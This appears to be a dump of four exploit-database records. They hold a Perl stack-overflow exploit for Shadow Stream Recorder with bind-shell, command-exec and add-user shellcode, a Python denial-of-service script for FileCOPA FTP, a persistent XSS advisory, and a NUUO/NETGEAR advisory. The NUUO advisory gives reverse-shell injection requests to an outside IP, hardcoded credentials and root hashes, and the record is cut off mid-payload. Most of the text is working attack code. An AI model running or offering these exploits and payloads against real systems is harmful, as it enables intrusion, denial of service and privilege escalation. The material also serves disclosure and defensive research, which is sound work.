8426,"Shadow Stream Recorder - '.m3u' Universal Stack Overflow #!/usr/bin/perl # Shadow Stream Recorder (.m3u file) Local Universal Stack Overflow Exploit # By AlpHaNiX [NullArea.Net] # alpha[at]hacker.bz # Made in Tunisia ########### # program : Shadow Stream Recorder # download : http://www.rm-to-mp3.net/downloads/ssrecordersetup.exe # program homepage : http://www.mini-stream.net/shadow-stream-recorder/ ########## # Exploit In Action : #[!] usage : #    ./sploit.pl bindshell #    ./sploit.pl cmdexec #    ./sploit.pl adduser ########## # C:\>sploit.pl bindshell #[!] Done # C:\>nc localhost 4444 # Console - Windows Trust 3.0 (Service Pack 3: v5512) # #(C) 1985-2008 Microsoft Corp. # Everything Tested Under Windows XP SP3 FR # After Creating The File just open the program & drag and drop m3u evil file ! :)    sub help {print ""[!] usage :   \n    ./sploit.pl bindshell \n    ./sploit.pl cmdexec \n    ./sploit.pl adduser \n "" ;exit();}  &help unless $ARGV[0];   my $sploit = $ARGV[0]; my $junk   = ""http://"".""A"" x 26117; my $ret    = ""\x63\x46\x92\x7C""; my $nope   = ""\x90"" x 30;   # win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub , thanks metasploit my $calc_shellcode = ""\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc9"". ""\x2c\xc9\x40\x83\xeb\xfc\xe2\xf4\x35\xc4\x8d\x40\xc9\x2c\x42\x05"". ""\xf5\xa7\xb5\x45\xb1\x2d\x26\xcb\x86\x34\x42\x1f\xe9\x2d\x22\x09"". ""\x42\x18\x42\x41\x27\x1d\x09\xd9\x65\xa8\x09\x34\xce\xed\x03\x4d"". ""\xc8\xee\x22\xb4\xf2\x78\xed\x44\xbc\xc9\x42\x1f\xed\x2d\x22\x26"". ""\x42\x20\x82\xcb\x96\x30\xc8\xab\x42\x30\x42\x41\x22\xa5\x95\x64"". ""\xcd\xef\xf8\x80\xad\xa7\x89\x70\x4c\xec\xb1\x4c\x42\x6c\xc5\xcb"". ""\xb9\x30\x64\xcb\xa1\x24\x22\x49\x42\xac\x79\x40\xc9\x2c\x42\x28"". ""\xf5\x73\xf8\xb6\xa9\x7a\x40\xb8\x4a\xec\xb2\x10\xa1\xdc\x43\x44"". ""\x96\x44\x51\xbe\x43\x22\x9e\xbf\x2e\x4f\xa8\x2c\xaa\x02\xac\x38"". ""\xac\x2c\xc9\x40"" ;  # win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com my $bindshell = ""\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x69"". ""\x45\x3b\x07\x83\xeb\xfc\xe2\xf4\x95\x2f\xd0\x4a\x81\xbc\xc4\xf8"". ""\x96\x25\xb0\x6b\x4d\x61\xb0\x42\x55\xce\x47\x02\x11\x44\xd4\x8c"". ""\x26\x5d\xb0\x58\x49\x44\xd0\x4e\xe2\x71\xb0\x06\x87\x74\xfb\x9e"". ""\xc5\xc1\xfb\x73\x6e\x84\xf1\x0a\x68\x87\xd0\xf3\x52\x11\x1f\x2f"". ""\x1c\xa0\xb0\x58\x4d\x44\xd0\x61\xe2\x49\x70\x8c\x36\x59\x3a\xec"". ""\x6a\x69\xb0\x8e\x05\x61\x27\x66\xaa\x74\xe0\x63\xe2\x06\x0b\x8c"". ""\x29\x49\xb0\x77\x75\xe8\xb0\x47\x61\x1b\x53\x89\x27\x4b\xd7\x57"". ""\x96\x93\x5d\x54\x0f\x2d\x08\x35\x01\x32\x48\x35\x36\x11\xc4\xd7"". ""\x01\x8e\xd6\xfb\x52\x15\xc4\xd1\x36\xcc\xde\x61\xe8\xa8\x33\x05"". ""\x3c\x2f\x39\xf8\xb9\x2d\xe2\x0e\x9c\xe8\x6c\xf8\xbf\x16\x68\x54"". ""\x3a\x16\x78\x54\x2a\x16\xc4\xd7\x0f\x2d\x2a\x5b\x0f\x16\xb2\xe6"". ""\xfc\x2d\x9f\x1d\x19\x82\x6c\xf8\xbf\x2f\x2b\x56\x3c\xba\xeb\x6f"". ""\xcd\xe8\x15\xee\x3e\xba\xed\x54\x3c\xba\xeb\x6f\x8c\x0c\xbd\x4e"". ""\x3e\xba\xed\x57\x3d\x11\x6e\xf8\xb9\xd6\x53\xe0\x10\x83\x42\x50"". ""\x96\x93\x6e\xf8\xb9\x23\x51\x63\x0f\x2d\x58\x6a\xe0\xa0\x51\x57"". ""\x30\x6c\xf7\x8e\x8e\x2f\x7f\x8e\x8b\x74\xfb\xf4\xc3\xbb\x79\x2a"". ""\x97\x07\x17\x94\xe4\x3f\x03\xac\xc2\xee\x53\x75\x97\xf6\x2d\xf8"". ""\x1c\x01\xc4\xd1\x32\x12\x69\x56\x38\x14\x51\x06\x38\x14\x6e\x56"". ""\x96\x95\x53\xaa\xb0\x40\xf5\x54\x96\x93\x51\xf8\x96\x72\xc4\xd7"". ""\xe2\x12\xc7\x84\xad\x21\xc4\xd1\x3b\xba\xeb\x6f\x99\xcf\x3f\x58"". ""\x3a\xba\xed\xf8\xb9\x45\x3b\x07"";   # win32_adduser -  PASS=alphanix EXITFUNC=seh USER=nullarea Size=244 Encoder=PexFnstenvSub http://metasploit.com my $add_user = ""\x2b\xc9\x83\xe9\xc9\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xca"". ""\x75\xb1\x0a\x83\xeb\xfc\xe2\xf4\x36\x9d\xf5\x0a\xca\x75\x3a\x4f"". ""\xf6\xfe\xcd\x0f\xb2\x74\x5e\x81\x85\x6d\x3a\x55\xea\x74\x5a\x43"". ""\x41\x41\x3a\x0b\x24\x44\x71\x93\x66\xf1\x71\x7e\xcd\xb4\x7b\x07"". ""\xcb\xb7\x5a\xfe\xf1\x21\x95\x0e\xbf\x90\x3a\x55\xee\x74\x5a\x6c"". ""\x41\x79\xfa\x81\x95\x69\xb0\xe1\x41\x69\x3a\x0b\x21\xfc\xed\x2e"". ""\xce\xb6\x80\xca\xae\xfe\xf1\x3a\x4f\xb5\xc9\x06\x41\x35\xbd\x81"". ""\xba\x69\x1c\x81\xa2\x7d\x5a\x03\x41\xf5\x01\x0a\xca\x75\x3a\x62"". ""\xf6\x2a\x80\xfc\xaa\x23\x38\xf2\x49\xb5\xca\x5a\xa2\x85\x3b\x0e"". ""\x95\x1d\x29\xf4\x40\x7b\xe6\xf5\x2d\x16\xdc\x6e\xe4\x10\xc9\x6f"". ""\xea\x5a\xd2\x2a\xa4\x10\xc5\x2a\xbf\x06\xd4\x78\xea\x1b\xc4\x66"". ""\xa6\x14\xc3\x6f\xab\x55\xd0\x66\xba\x1d\xd0\x64\xa3\x0d\x91\x25"". ""\x8b\x31\xf5\x2a\xec\x53\x91\x64\xaf\x01\x91\x66\xa5\x16\xd0\x66"". ""\xad\x07\xde\x7f\xba\x55\xf0\x6e\xa7\x1c\xdf\x63\xb9\x01\xc3\x6b"". ""\xbe\x1a\xc3\x79\xea\x1b\xc4\x66\xa6\x14\xc3\x6f\xab\x55\x9e\x4b"". ""\x8e\x31\xb1\x0a"";  if ($sploit eq 'bindshell') {open(file,'>Exploit.m3u');print file $junk.$ret.$nope.$bindshell;close(file);print ""[!] Done \n"";}  elsif ($sploit eq 'cmdexec') {open(file,'>Exploit.m3u');print file $junk.$ret.$nope.$calc_shellcode;close(file);print ""[!] Done \n""}  elsif ($sploit eq 'adduser') {open(file,'>Exploit.m3u');print file $junk.$ret.$nope.$add_user;close(file);print ""[!] Done \n""}  else {&help}  # milw0rm.com [2009-04-14]",local,local,1
38626,"FileCOPA FTP Server - Remote Denial of Service source: https://www.securityfocus.com/bid/60909/info  FileCOPA FTP Server is prone to a remote denial-of-service vulnerability.  Attackers can exploit this issue to crash the affected application, denying service to legitimate users.  FileCOPA FTP Server 7.01 is vulnerable; other versions may also be affected.   #!/usr/bin/python  import socket import sys   PAYLOAD = ""\x41"" * 7000   print(""\n\n[+] FileCOPA V7.01 HTTP POST Denial Of Service"") print(""[+] Version: V7.01"") print(""[+] Chako\n\n\n"")  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(('www.example.com',81))  s.send(""POST /"" + PAYLOAD + ""/ HTTP/1.0\r\n\r\n"")   s.close() print(""[!] Done! Exploit successfully sent\n"")",remote,dos,1
23499,"Enterpriser16 Load Balancer 7.1 - Multiple Cross-Site Scripting Vulnerabilities Title: ====== Enterpriser16 Load Balancer v7.1 - Multiple Web Vulnerabilities   Date: ===== 2012-12-12   References: =========== http://www.vulnerability-lab.com/get_content.php?id=785   VL-ID: ===== 785   Common Vulnerability Scoring System: ==================================== 3.5   Introduction: ============= Load Balancer .org have cemented our reputation as market leaders in affordable server load balancing appliances with the ground-breaking  release of firmware v7.0 for the Enterprise product family – which includes a slick new web interface design and many additional features  which continue to keep us one step ahead of the competition.  (Copy of the Vendor Homepage:  http://www.loadbalancer.org )    Abstract: ========= The Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in Enterpriser16 LoadBalancer v7.1.   Report-Timeline: ================ 2012-12-12:	Public or Non-Public Disclosure   Status: ======== Published   Affected Products: ==================  Exploitation-Technique: ======================= Remote   Severity: ========= Medium   Details: ======== Multiple persistent input validation web vulnerabilities are detected in the Enterpriser16 v7.1 Load Balancer Application. The bug allows remote attackers to implement/inject own malicious script code on the application side (persistent) of the service.  The first vulnerabilities are located in the `Edit Configuration` module with the bound vulnerable Label, Virtual Host, Request to  send, Email Alerts  and  Response expected parameters.   The secound vulnerabilities are located in the Create Solution, Access points and New Contract module with the bound vulnerable  title, asset name, contract name, name or description parameter requests.   Exploitation requires low user interaction and a low privileged application user account. Successful exploitation of the vulnerability  can lead to persistent session hijacking (manager/admin), persistent phishing or persistent module web context manipulation.   Vulnerable Module(s):	(Edit Configuration)  			[+] Edit Configuration > layer4 > Virtual Servers 			[+] Edit Configuration > Layer4 > Real Server 			[+] Edit Configuration > SSL termination > Modify  Vulnerable Parameter(s):  			[+] [Label] [Virtual Host] [Request to send][Email Alerts][Response expected] 			[+] [Label] 			[+] [Label]    Vulnerable Module(s): 	(Admin/Moderator Back-End)  			[+] Solution > Create Solution 			[+] Assets > It Assets > Access points 			[+] Contract > New Contract  Vulnerable Parameter(s):  			[+] [Title] 			[+] [Asset name] 			[+] [Contract Name] - [Description] - [Name] - [Support]   Proof of Concept: ================= The persistent input validation vulnerability can be exploited by remote attackers with low required user interaction & low privileged user account.  For demonstration or reproduce ...  Review: Edit Configuration > layer4 > Virtual Servers - [Label] [Virtual Host] [Request to send] [Email Alerts] [Response expected] <pre> #0 /var/www/html/lbadmin/inc/ldirectord.inc(695): execute('/etc/rc.d/rc.lv...') #1 /var/www/html/lbadmin/inc/ldirectord.inc(610):  tcp_timeouts(Array) #2 /var/www/html/lbadmin/config/ldirectord.php(627): ldirectord_vip_edit('0', 'ipv4', '10.1.1.5', '80', ' <h1>[PERSISTENT INJECTED SCRIPT CODE!]</h1> ', 'tcp', 'masq', '255.255.255.255', '127.0.0.1', '9081', 'yes', '300', 'wrr', 'none', ' <h1>[PERSISTENT INJECTED SCRIPT CODE!]</h1> <h1>[PERSISTENT INJECTED SCRIPT CODE!]</h1> <h1>[PERSISTENT INJECTED SCRIPT CODE!]</h1> <h1>[PERSISTENT INJECTED SCRIPT CODE!]</h1> </pre>   URL: http://loadbalancer.127.0.0.1:8080/lbadmin/config/ldirectord.php?action=modvirtual&subaction=editdata&v=0&t=1355504097  ...  Review: Edit Configuration > Add New Floating IP  <p class=""error""> Error: <em> The Floating IP address ' <iframe [PERSISTENT INJECTED SCRIPT CODE!]> <html> <head> <body vlink=""#990000"" text=""#990000"" link=""#990000"" bgcolor=""#000000"" alink=""#999999"" dir=""ltr""> </html> </iframe> </em> </p>  URL: http://loadbalancer.127.0.0.1:8080/lbadmin/config/changevips.php?mnp=edit&submnp=efip&t=1355527607&l=e  ...  Review: Edit Configuration > SSL termination > Modify  [Label] [Ciphers to use] <pre> execute(): 'cp /usr/local/etc/certs/server.pem /usr/local/etc/certs/ <h1>label</h1> .pem' failed: errno 1, </pre> <p></p> <h3>Trace:</h3> <p></p> <pre> #0 /var/www/html/lbadmin/inc/pound.inc(164): execute('cp /usr/local/e...') #1 /var/www/html/lbadmin/config/pound.php(243): pound_vip_add(' <h1>[PERSISTENT INJECTED SCRIPT CODE!]</h1> ', 'ipv4', '10.0.0.20', '443', '10.0.0.20', '80', ' <h1> [PERSISTENT INJECTED SCRIPT CODE!] <p></p> </h1> </pre>  URL: http://loadbalancer.127.0.0.1:8080/lbadmin/config/pound.php?action=adddata&t=1355504561  ...  Review: Edit Configuration > Physical - Advanced Configuration  <p class=""error""> Error: <em> Input field failed the validation. <br> '""> <iframe [PERSISTENT INJECTED SCRIPT CODE!]> ' is not a valid IP address. </em> </p>  URL: http://loadbalancer.127.0.0.1:8080/lbadmin/config/physicaladv.php?mnp=edit&submnp=epa&t=1355527441&l=e    Risk: ===== The security risk of the persistent input validation vulnerabilities are estimated as medium(+).    Credits: ======== Vulnerability Laboratory [Research Team] - Ibrahim El-Sayed (the_storm) [storm@vulnerability-lab.com] [iel-sayed.blogspot.com]   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright © 2012 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",remote,webapps,1
40200,"NUUO NVRmini2 / NVRsolo / Crystal Devices / NETGEAR ReadyNAS Surveillance Application - Multiple Vulnerabilities >> Multiple vulnerabilities in NUUO NVRmini2 / NVRsolo / Crystal devices and NETGEAR ReadyNAS Surveillance application >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/) ========================================================================== Disclosure: 04/08/2016 / Last updated: 04/08/2016   >> Background on the affected products: ""NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS functionality. Setup is simple and easy, with automatic port forwarding settings built in. NVRmini 2 supports POS integration, making this the perfect solution for small retail chain stores. NVRmini 2 also comes full equipped as a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping and RAID functions for data protection. Choose NVR and know that your valuable video data is safe, always."" ""NVRsolo is NUUO’s answer to hassle free, lightweight NVR system. It is small in size yet able to handle heavy duty tasks. With local HDMI/VGA display and keyboard/mouse input built right into the unit, configuring NVRsolo is easy and simple. Built on solid Linux foundation, we sacrificed nothing except unnecessary bulk to make NVRsolo the award winning standalone NVR solution you have been looking for. NVRsolo's flexibility doesn't end there. For those needing more storage options, we offer 8 bay versions to meet your needs."" ""NUUO Crystal™ is the product that represents the next stage in VMS evolution. Rock solid, easily manageable, with powerful recording and viewing options available. Featuring revolutionary modular system structure that is made to handle large project size, NUUO Crystal™ is the ideal choice for your enterprise. Featuring technology that focuses on delivering stable video recording performance, recording failover, and 3rd party integration choice, you will be impressed with the stability and flexible options with NUUO Crystal™."" ""(ReadyNAS Surveillance) NETGEAR combines leading storage and switching solutions together with sophisticated network video recording software to provide an affordable and easy to install and manage surveillance solution. Small businesses and corporate branch offices require a secure way to protect physical assets, but may lack deep security expertise or a big budget. A user-friendly NVR system should combine fast and flexible configuration with easy operation. With a few simple steps for installation, the web-based management leads users to configure, monitor and playback video everywhere. UPnP search, auto camera detection and GUI schedule save setting-up time, while the easy drag and drop camera, auto scan, preset point patrolling, and multiple views offer users a prime monitoring experience.""   >> Summary: NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.  The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.  Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.  A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.   >> Technical details: #1 Vulnerability: Improper Input Validation (leading to remote code execution) CVE-2016-5674 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):  function print_file($file_fullpath_name) {     $cmd = ""cat "" . $file_fullpath_name;     echo $file_fullpath_name . ""\n\n"";     system($cmd); }  <?php     if (isset($_GET['log']) && !empty($_GET['log']))     {         $file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);         print_file($file_fullpath_name);     }     else     {         die(""unknown command."");     } ?>  The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept: - ReadyNAS Surveillance: GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,""192.168.1.204%3a9000"")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b' This will connect a shell back to 192.168.1.204 on port 9000, running as the ""admin"" user.  - NVRmini 2 and NVRsolo: GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998  This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.   #2 Vulnerability: Improper Input Validation (leading to remote code execution) CVE-2016-5675 Attack Vector: Remote Constraints: Requires an administrator account Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):     else if ($act == 'update')     {         $cmd = sprintf(""/usr/bin/ntpdate %s"", $_GET['NTPServer']);                  $find_str = ""time server"";                  $sys_msg = system($cmd);         $pos = strpos($sys_msg, $find_str);  The file can only be accessed by an authenticted user. - ReadyNAS Surveillance: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test This will create a /tmp/test file with the contents of ""admin"" (current user).  - NVRmini 2 and NVRsolo: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f Connects a shell to 192.168.1.204, port 9000, running as root.  - Crystal: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26 Connects a shell to 192.168.1.204, port 4444, running as root.   #3 Vulnerability: Administrator password reset CVE-2016-5676 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication) - NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication) - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.  Proof of concept: GET /cgi-bin/cgi_system?cmd=loaddefconfig  This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.   #4 Vulnerability: Information disclosure (system processes, available memory and filesystem status) CVE-2016-5677 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request: POST /__nvr_status___.php HTTP/1.1 username=nuuoeng&password=qwe23622260&submit=Submit   #5  Vulnerability: Harcoded root password  CVE-2016-5678 Affected products / versions: - NUUO NVRmini 2, firmware v1.0.0 to 3.0.0  - NUUO NVRsolo, firmware v1.0.0 to 3.0.0  The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.  NVRmini 2:   #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::   root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::  NVRsolo:   #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::   root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::     #6  Vulnerability: Command injection in cgi_main transfer license command CVE-2016-5679 Attack Vector: Local / Remote Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user Affected products / versions: - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)  The transfer_license command has a command injection vulnerability in the ""sn"" parameter: cgi_main?cmd=transfer_license&method=offline&sn="";<command>;#  Sample exploit for NVRmini2 (open bind shell on port 4444): GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23  NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead: GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23  > Local exploitation: This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command: CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>' The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.               #7  Vulnerability: Stack buffer overflow in cgi_main transfer license command CVE-2016-5680 Attack Vector: Local / Remote Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)  The ""sn"" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the ""sn"" parameter is copied directly into a string with a fixed length of 128 characters.  Function 0x20BC9C (NVRmini2 firmware v3.0.0):       method = getval(""method"");       sn = getval(""sn"");       (...)       memset(&command, 0, 128);       sprintf(&command, ""logger -p local0.info -t 'system' \""Activate license: %s\"""", sn);       system(&command);  > For example if the following request is performed: GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa